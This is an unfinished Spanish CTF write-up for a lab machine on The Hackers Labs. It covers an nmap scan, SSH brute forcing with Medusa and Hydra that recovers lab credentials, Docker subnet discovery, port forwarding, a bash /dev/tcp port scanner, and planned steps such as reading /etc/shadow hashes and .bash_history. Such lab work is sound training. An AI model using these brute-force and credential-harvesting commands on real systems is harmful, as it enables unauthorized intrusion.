# 🎩 Pa Que Aiga Lujo - Writeup Completo

![The Hackers Labs](https://img.shields.io/badge/Platform-The%20Hackers%20Labs-blueviolet?style=for-the-badge)
![Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)

> Una máquina que combina reconocimiento web, fuerza bruta, pivoting por Docker y escalada de privilegios. ¡Un verdadero lujo de pentesting!

---

## 📋 Tabla de Contenidos

- [Descripción](#descripción)
- [Tecnologías Utilizadas](#tecnologías-utilizadas)
- [Fase 1: Reconocimiento](#fase-1-reconocimiento)
- [Fase 2: Acceso Inicial](#fase-2-acceso-inicial)
- [Fase 3: Pivoting Interno](#fase-3-pivoting-interno)
- [Fase 4: Explotación Docker](#fase-4-explotación-docker)
- [Fase 5: Escalada Final](#fase-5-escalada-final)
- [Flags](#flags)

---


# **📌 Write-up CTF: Lujo Collection - Enfoque en Escalada de Privilegios y Movimiento Lateral**

---

## **📂 1. Estructura del Entorno**
Se organizó el espacio de trabajo en carpetas para mantener el orden y la claridad durante la ejecución del CTF:

```bash
$ ls
 exploit   files   notes   post   recon
```

- **`recon/`**: Contiene scripts y resultados de reconocimiento.
- **`files/`**: Diccionarios, credenciales y archivos extraídos.
- **`notes/`**: Notas manuales y observaciones clave.
- **`exploit/`**: Exploits personalizados o scripts de ataque.
- **`post/`**: Post-explotación y escalada de privilegios.

> **🔹 Nota**: Todo está configurado en **ZSH** para agilizar comandos como `recon` y `enum`.

---

## **🔍 2. Reconocimiento Inicial (Nmap)**
Se escaneó la IP objetivo IP  para identificar servicios expuestos:

```bash
$ nmap -sV -p- -T4 IP
```

### **📜 Resultados del Escaneo**
| **Puerto** | **Estado** | **Servicio**          | **Versión**                     |
|------------|------------|-----------------------|---------------------------------|
| 22/tcp     | Abierto    | SSH                   | OpenSSH 9.2p1 Debian 2+deb12u7  |
| 80/tcp     | Abierto    | HTTP                  | Apache 2.4.62 (Debian)          |

> **🔹 Observaciones**:
> - **SSH**: Versión moderna con soporte para ECDSA y ED25519.
> - **HTTP**: Servidor Apache con título `LuxeCollection - Artículos de Lujo Exclusivos`.

---

## **🌐 3. Análisis de la Web (Puerto 80)**
Se inspeccionó el sitio web para extraer información útil:

### **🔎 Acciones Realizadas**
1. **Inspección manual**:
   - Se revisaron nombres de usuarios en productos, categorías y metadatos.
   - Se identificaron nombres como `Sophia`, `Luxe`, `Admin`, etc.

2. **Generación de diccionario de usuarios**:
   ```bash
   $ cat users.txt
   Sophia
   Admin
   Luxe
   cipote
   ```

3. **Posibles contraseñas**:
   - Se usó un diccionario personalizado (`diccionario.txt`) y alternativas como `rockyou.txt`.

---

## **🔓 4. Fuerza Bruta en SSH (Medusa/Hydra)**
Se intentó autenticarse en el servicio SSH con el usuario `Sophia` y contraseñas del diccionario.

### **🛠️ Comando con Medusa**
```bash
$ medusa -U users.txt -P /usr/share/wordlists/rockyou.txt -h 192.168 -M ssh -t 4 -f -O medusa_out.txt
```
> **🔹 Resultado**:
> ```
> [22][ssh] host: IP login: Sophia password: dolphins
> ```

### **🛠️ Alternativa con Hydra**
```bash
$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168 -t 4 -T 1 -u -V
```
> **🔹 Resultado**:
> ```
> [22][ssh] host: IP login: Sophia password: dolphins
> ```

### **🔑 Acceso al Sistema**
```bash
$ ssh Sophia@IP
Password: dolphins
```

---

## **🔐 5. Reconocimiento Interno**
Una vez dentro, se enumeró el sistema para identificar vectores de escalada.

### **👥 Usuarios del Sistema**
```bash
$ cat /etc/passwd | grep sh$
```
```plaintext
root:x:0:0:root:/root:/bin/bash
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
Sophia:x:1001:1001:,,,:/home/Sophia:/bin/bash
cipote:x:1002:1002:,,,:/home/cipote:/bin/bash
```

> **🔹 Observación**: Existe un usuario `cipote` no documentado.

### **🌐 Interfaces de Red**
```bash
$ ip a
```
```plaintext
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    inet 127.0.0.1/8 scope host lo
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 10.0.4.91/24 scope global dynamic enp0s3
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    inet 172.17.0.1/16 scope global docker0
5: veth7d79586@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default
    link/ether 72:b4:9c:b3:44:9b brd ff:ff:ff:ff:ff:ff link-netnsid 0
```

> **🔹 Hallazgo**: Interfaz `docker0` con IP `172.17.0.1`, indicando contenedores Docker en ejecución.

---

## **🔄 6. Movimiento Lateral (Docker)**
Se exploró la red interna para descubrir hosts adicionales.

### **🔍 Ping Sweep en la Subred Docker**
```bash
$ for i in {1..254}; do (ping -c 1 172.17.0.$i | grep "bytes from" &); done
```
```plaintext
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.034 ms
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.025 ms
```

> **🔹 Resultado**: Host activo en `172.17.0.2`.
ssh -L 8080:172.17.0.2:80 Sophia@192.168
The authenticity of host can't be established.
ED25519 key fingerprint is SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168' (ED25519) to the list of known hosts.
Sophia@192.168.80.21's password: 
Linux TheHackersLabs-PaQueAigaLujo 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 26 19:26:26 2026 from 192.168
Sophia@TheHackersLabs-PaQueAigaLujo:~$ nano target.txt 
Sophia@TheHackersLabs-PaQueAigaLujo:~$ nano scan.sh
Sophia@TheHackersLabs-PaQueAigaLujo:~$ chmod +x scan.sh
Sophia@TheHackersLabs-PaQueAigaLujo:~$ ./scan.sh

[+] Iniciando escaneo en el objetivo: 172.17.0.1
[*] Port Active: 22
[*] Port Active: 80


[+] Iniciando escaneo en el objetivo: 172.17.0.2 # target

# CODIGO DEL SCANPORT.SH
 ```bash
   #!/usr/bin/bash 

while read host; do
  echo -e "\n[+] Iniciando escaneo en el objetivo: $host"
  for port in {1..1000}; do 
    timeout 1 bash -c "echo > /dev/tcp/$host/$port" 2>/dev/null && echo "[*] Port Active: $port"
  done
  echo ""
done < target.txt
   ```

---

## **🎯 7. Próximos Pasos (TO-DO)**
1. **Acceder al contenedor Docker** en `172.17.0.2`:
   ```bash
   $ ssh Sophia@172.17.0.2
   ```
   *O usar `nc` o `curl` si hay servicios expuestos.*

2. **Escalar privilegios** en el host principal:
   - Verificar permisos de `sudo`:
     ```bash
     $ sudo -l
     ```
   - Buscar binarios SUID:
     ```bash
     $ find / -perm -4000 2>/dev/null
     ```
   - Revisar crontabs:
     ```bash
     $ crontab -l
     $ ls -la /etc/cron*
     ```

3. **Explotar el usuario `cipote`**:
   - Buscar archivos con permisos especiales:
     ```bash
     $ find /home/cipote -type f -exec ls -la {} \;
     ```
   - Revisar historial de comandos:
     ```bash
     $ cat ~/.bash_history
     ```
# Identificación del CMS Drupal

Utilizando wget para obtener el contenido del servidor interno
    ```bash
    wget -qO- http://172.17.0.2/
   ```





4. **Post-explotación**:
   - Extraer hashes de `/etc/shadow`.
   - Buscar archivos sensibles en `/var/www/`, `/opt/`, etc.

---
## **📌 Resumen de Hallazgos**
| **Paso**               | **Resultado**                          | **Estado**       |
|------------------------|----------------------------------------|------------------|
| Reconocimiento inicial | Puertos 22 (SSH) y 80 (HTTP) abiertos | ✅ Completado     |
| Fuerza bruta SSH       | Credenciales: `Sophia:dolphins`        | ✅ Completado     |
| Reconocimiento interno | Usuario `cipote` y red Docker detectada| ✅ Completado     |
| Movimiento lateral     | Host `172.17.0.2` encontrado           | ⏳ Pendiente      |
| Escalada de privilegios| -                                      | ⏳ Pendiente      |

---
## **🚀 Conclusión**
El CTF presenta un entorno con:
- **Acceso inicial** mediante fuerza bruta en SSH.
- **Movimiento lateral** hacia contenedores Docker.
- **Posibles vectores de escalada** en usuarios no estándar (`cipote`).

**🔧 Recomendación**: Continuar con el análisis del contenedor en `172.17.0.2` y revisar permisos en el sistema principal.

---
> **📝 Nota final**: Mantener el entorno organizado (`recon/`, `notes/`, etc.) es clave para CTFs complejos.
```

